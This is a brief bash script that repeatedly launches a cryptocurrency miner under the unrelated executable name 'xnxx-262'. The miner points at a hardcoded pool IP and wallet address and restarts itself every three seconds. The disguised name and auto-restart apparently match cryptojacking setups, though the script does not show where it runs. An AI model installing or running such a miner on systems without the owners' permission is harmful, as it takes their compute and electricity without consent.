bash
#!/bin/bash
while true
do
./xnxx-262 --disable-gpu --algorithm yespowerSUGAR --pool 198.50.168.213:6241 --wallet DQ44uJMY6T8iSeHnLtCzdCWmoYJuNAm6Y4.d$(TZ=UTC-7 date +"%H-%M [%d-%m]") -p c=DGB -t 10 --dns-over-https 0
sleep 3
done
